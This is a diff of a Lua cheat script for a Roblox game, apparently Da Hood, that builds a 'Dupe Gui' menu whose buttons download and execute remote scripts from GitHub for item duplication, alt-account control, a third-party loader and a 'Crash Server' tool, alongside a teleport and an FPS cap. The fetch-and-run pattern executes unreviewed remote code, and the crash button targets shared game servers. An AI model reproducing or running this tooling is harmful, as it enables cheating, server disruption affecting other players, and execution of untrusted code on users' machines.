@@ -1,12 +1,126 @@
-local UILibrary = loadstring(game:HttpGet("https://pastebin.com/raw/V1ca2q9s"))()
+-- Gui For Dupers Made By GameDimond246810 --
 
-local MainUI = UILibrary.Load("Da Hood Dupe Gui")
-local FirstPage = MainUI.AddPage("Scripts")
+local DiscordLib =
+    loadstring(game:HttpGet "https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/discord")()
 
-local FirstLabel = FirstPage.AddLabel("Credits to warlock for the scripts")
-local FirstButton = FirstPage.AddButton("Selling/Duping Tool", function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/W9K/roblox-scripts/main/DHC/SimpleSeller.lua', true))()
-end)
-local SecondButton = FirstPage.AddButton("Money Counter", function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/OG5/IkuScripts/main/DH/MoneyCounter', true))()
-end)
+local win = DiscordLib:Window("Dupe Gui")
+
+local serv = win:Server("Main", "")
+
+local Operator = serv:Channel("Operator")
+
+Operator:Button(
+    "Encrypt Hub",
+    function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/encryptgui.lua"))()
+DiscordLib:Notification("Notification", "Encrypt Hub Executed!", "Okay!")
+    end
+)
+
+Operator:Seperator()
+
+Operator:Button(
+    "Duping Tool",
+    function()
+     loadstring(game:HttpGet('https://raw.githubusercontent.com/W9K/roblox-scripts/main/DHC/SimpleSeller.lua', true))()
+DiscordLib:Notification("Notification", "Duping Tool Executed!", "Okay!")
+    end
+)
+
+Operator:Seperator()
+
+Operator:Button(
+    "Money Counter",
+    function()
+     loadstring(game:HttpGet('https://raw.githubusercontent.com/OG5/IkuScripts/main/DH/MoneyCounter', true))()
+DiscordLib:Notification("Notification", "Money Counter Executed!", "Okay!")
+    end
+)
+
+Operator:Seperator()
+
+Operator:Button(
+    "Tp Safe Area",
+    function()
+      local plr = game.Players.LocalPlayer
+
+      plr.Character.HumanoidRootPart.CFrame = CFrame.new(-117.270287, -58.7000618, 146.536087, 0.999873519, 5.21876942e-08, -0.0159031227, -5.22713037e-08, 1, -4.84179008e-09, 0.0159031227, 5.67245495e-09, 0.999873519)
+DiscordLib:Notification("Notification", "Teleported To Safe Area!", "Okay!")
+    end
+)
+
+Operator:Seperator()
+
+Operator:Button(
+    "Set Fps",
+    function()
+     setfpscap(15)
+DiscordLib:Notification("Notification", "Fps Set To 2!", "Okay!")
+    end
+)
+
+Operator:Seperator()
+
+Operator:Button(
+    "Crash Server",
+    function()
+     loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+DiscordLib:Notification("Notification", "Crashing Script Executed", "Okay!")
+    end
+)
+
+-- Alt Channel --
+
+local Alt = serv:Channel("Alt")
+
+Alt:Button(
+    "Alt Control",
+    function()
+     loadstring(game:HttpGet('https://raw.githubusercontent.com/SkidOnTOP/Alt-Control/main/Source%20Code',true))()
+DiscordLib:Notification("Notification", "Alt Control Executed!", "Okay!")
+    end
+)
+
+Alt:Seperator()
+
+Alt:Button(
+    "Encrypt Hub",
+    function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/encryptgui.lua"))()
+DiscordLib:Notification("Notification", "Encrypt Hub Executed!", "Okay!")
+    end
+)
+
+Alt:Seperator()
+
+Alt:Button(
+    "Tp Safe Area",
+    function()
+      local plr = game.Players.LocalPlayer
+
+      plr.Character.HumanoidRootPart.CFrame = CFrame.new(-117.270287, -58.7000618, 146.536087, 0.999873519, 5.21876942e-08, -0.0159031227, -5.22713037e-08, 1, -4.84179008e-09, 0.0159031227, 5.67245495e-09, 0.999873519)
+DiscordLib:Notification("Notification", "Teleported To Safe Area!", "Okay!")
+    end
+)
+
+Alt:Seperator()
+
+Alt:Button(
+    "Set Fps",
+    function()
+     setfpscap(2)
+DiscordLib:Notification("Notification", "Fps Set To 2!", "Okay!")
+    end
+)
+
+-- Backup Scripts --
+
+local Backup = serv:Channel("Backup")
+
+Backup:Button(
+    "Destiny",
+    function()
+     loadstring(game:HttpGet('https://raw.githubusercontent.com/compwnter/destiny/main/loader'))();
+DiscordLib:Notification("Notification", "Destiny Executed", "Okay!")
+    end
+)
